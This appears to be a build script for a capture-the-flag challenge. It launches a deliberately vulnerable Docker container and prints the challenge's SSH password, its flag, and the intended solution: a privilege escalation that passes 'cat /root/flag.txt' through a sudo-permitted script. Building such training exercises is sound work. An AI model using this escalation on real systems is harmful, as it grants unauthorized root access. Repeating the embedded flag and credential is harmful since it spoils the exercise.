#!/bin/bash
# CH6 Part B - build/run helper.
#
# Usage:
#   CH6_PLAYER_PASSWORD="gh0st_1n_th3_w1r3" \
#   CH6_FLAG="SBB{sudo_wildcard_is_not_a_sandbox}" \
#   ./build.sh
#
# CH6_PLAYER_PASSWORD MUST equal the credential produced by
# ../partA/build_challenge.py (that script prints it as
# "[organizer-only] CREDENTIAL"), so that Part A's recovered secret is
# exactly the Part B SSH password, per Section 10.6.

set -euo pipefail

: "${CH6_PLAYER_PASSWORD:?Set CH6_PLAYER_PASSWORD to the CH6 Part A recovered credential}"
: "${CH6_FLAG:=SBB{sudo_wildcard_is_not_a_sandbox}}"

export CH6_PLAYER_PASSWORD
export CH6_FLAG

docker compose up --build -d
echo
echo "Container is up. SSH in with:"
echo "  ssh -p 2222 player@localhost   (password: \$CH6_PLAYER_PASSWORD)"
echo
echo "Intended exploit once inside:"
echo "  sudo -l"
echo "  sudo /opt/novagrid/logrotate_check.sh 'cat /root/flag.txt'"
